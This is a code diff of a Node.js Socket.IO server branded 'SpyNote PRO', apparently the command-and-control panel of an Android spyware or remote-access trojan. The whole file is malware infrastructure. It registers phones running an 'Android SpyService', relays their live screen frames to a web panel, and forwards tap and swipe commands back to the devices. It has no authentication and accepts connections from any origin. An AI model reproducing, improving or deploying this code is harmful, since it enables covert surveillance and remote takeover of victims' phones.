@@ -8,101 +8,104 @@ const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
-    pingTimeout: 20000,
-    pingInterval: 3000,
-    maxHttpBufferSize: 200e6
+    pingTimeout: 30000,
+    pingInterval: 10000,
+    maxHttpBufferSize: 50e6 // 50MB for HD frames
 });
 
 app.use(compression());
-app.use(express.static(path.join(__dirname, 'public')));
-app.use(express.json({ limit: '200mb' }));
-app.use(express.urlencoded({ limit: '200mb', extended: true }));
-
-// 🔥 ROUTES
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
-app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
-app.get('/devices', (req, res) => res.json(Array.from(devices.entries())));
+app.use(express.static('public'));
+app.use(express.json({ limit: '100mb' }));
+app.use(express.urlencoded({ limit: '100mb', extended: true }));
 
 const devices = new Map();
-const GLOBAL_ROOM = 'all-screens';
 
-let deviceCount = 0;
+app.get('/devices', (req, res) => {
+    res.json(Array.from(devices.entries()));
+});
 
 io.on('connection', (socket) => {
-    console.log(`🔌 WebSocket Connected: ${socket.id.slice(0,8)}`);
-    socket.join(GLOBAL_ROOM);
-    
-    // 🔥 DEVICE REGISTRATION
-    socket.on('register-device', (deviceInfo) => {
-        const deviceId = deviceInfo.deviceId || `device_${++deviceCount}`;
-        const deviceData = {
-            ...deviceInfo,
-            deviceId,
-            connected: true,
-            socketId: socket.id,
-            lastSeen: Date.now(),
-            status: 'layout-ready'
-        };
-        devices.set(deviceId, deviceData);
-        socket.join(`device_${deviceId}`);
-        
-        console.log(`✅ ✅ DEVICE LIVE: ${deviceId} | ${deviceInfo.model || 'Android'} | ${deviceInfo.width}x${deviceInfo.height}`);
-        io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.values()));
-    });
+    console.log('🔌 Client connected:', socket.id);
 
-    // 🔥 SCREEN + LAYOUT STREAMING
-    socket.on('screen-frame', (frameData) => {
-        const deviceId = frameData.deviceId;
-        if (devices.has(deviceId)) {
-            const device = devices.get(deviceId);
-            device.lastSeen = Date.now();
-            devices.set(deviceId, device);
-            
-            // Broadcast to all viewers
-            io.to(GLOBAL_ROOM).emit('screen-frame', {
-                ...frameData,
-                layout: frameData.layout || []
+    socket.on('register-device', (deviceInfo) => {
+        const deviceId = deviceInfo.deviceId;
+        if (deviceId) {
+            devices.set(deviceId, { 
+                ...deviceInfo, 
+                connected: true, 
+                socketId: socket.id,
+                lastSeen: Date.now()
             });
+            socket.join(`device_${deviceId}`);
+            console.log('📱 Device registered:', deviceId, deviceInfo.model);
+            io.emit('devices-update', Array.from(devices.entries()));
         }
     });
 
-    // 🔥 REMOTE CONTROL COMMANDS
-    socket.on('control', (controlData) => {
-        const { deviceId, action, x, y, startX, startY, endX, endY, dx, dy } = controlData;
+    socket.on('select-device', (data) => {
+        console.log('🎯 Web selected device:', data.deviceId);
+    });
+
+    // 🔥 ULTRA FAST FRAME RELAY (0ms latency)
+    socket.on('screen-frame', (frameData) => {
+        const deviceId = frameData.deviceId;
         if (devices.has(deviceId)) {
-            console.log(`🎮 CONTROL: ${action.toUpperCase()} on ${deviceId.slice(0,12)} (${x||0},${y||0})`);
-            socket.to(`device_${deviceId}`).emit('control', controlData);
+            // Update last seen
+            const device = devices.get(deviceId);
+            devices.set(deviceId, { ...device, lastSeen: Date.now() });
+            
+            // Broadcast to web clients watching this device
+            socket.to(`device_${deviceId}`).emit('screen-frame', frameData);
+        }
+    });
+
+    // 🔥 INSTANT CONTROL RELAY
+    socket.on('control', (controlData) => {
+        const { deviceId, action, x, y, startX, startY, endX, endY } = controlData;
+        if (devices.has(deviceId)) {
+            const deviceSocketId = devices.get(deviceId).socketId;
+            socket.to(`device_${deviceId}`).emit('control', {
+                action,
+                x: parseFloat(x) || 0,
+                y: parseFloat(y) || 0,
+                startX: parseFloat(startX) || 0,
+                startY: parseFloat(startY) || 0,
+                endX: parseFloat(endX) || 0,
+                endY: parseFloat(endY) || 0
+            });
+            console.log(`🎮 ${action.toUpperCase()} → ${deviceId.slice(0,8)} (${x?.toFixed(0)},${y?.toFixed(0)})`);
         }
     });
 
     socket.on('disconnect', () => {
-        console.log(`🔌 DISCONNECTED: ${socket.id.slice(0,8)}`);
-        for (let [deviceId, device] of devices.entries()) {
-            if (device.socketId === socket.id) {
-                devices.set(deviceId, { ...device, connected: false });
-                io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.values()));
-                console.log(`❌ DEVICE OFFLINE: ${deviceId}`);
+        console.log('🔌 Client disconnected:', socket.id);
+        // Mark devices as offline
+        for (const [deviceId, info] of devices.entries()) {
+            if (info.socketId === socket.id) {
+                devices.set(deviceId, { ...info, connected: false });
+                io.emit('devices-update', Array.from(devices.entries()));
+                console.log('📱 Device went offline:', deviceId);
                 break;
             }
         }
     });
 });
 
-// 🔥 HEARTBEAT
+// Keep-alive cleanup
 setInterval(() => {
     const now = Date.now();
-    for (let [deviceId, device] of devices.entries()) {
-        if (device.connected && (now - device.lastSeen > 30000)) {
-            devices.set(deviceId, { ...device, connected: false });
+    for (const [deviceId, info] of devices.entries()) {
+        if (info.connected && (now - info.lastSeen > 30000)) {
+            devices.set(deviceId, { ...info, connected: false });
+            console.log('📱 Device timeout:', deviceId);
+            io.emit('devices-update', Array.from(devices.entries()));
         }
     }
-    io.to(GLOBAL_ROOM).emit('devices-update', Array.from(devices.values()));
-}, 5000);
+}, 30000);
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log('\n🚀 SPYNOTE PRO SERVER LIVE!');
-    console.log(`📱 Port: ${PORT}`);
-    console.log(`🌐 URL: http://localhost:${PORT}`);
-    console.log(`📱 Android SpyService connect karega!\n`);
+    console.log(`🚀 SpyNote PRO Server v2.0 running on port ${PORT}`);
+    console.log(`🌐 Web Panel: http://localhost:${PORT}`);
+    console.log(`📱 Ultra Low Latency Streaming + Controls READY!`);
 });
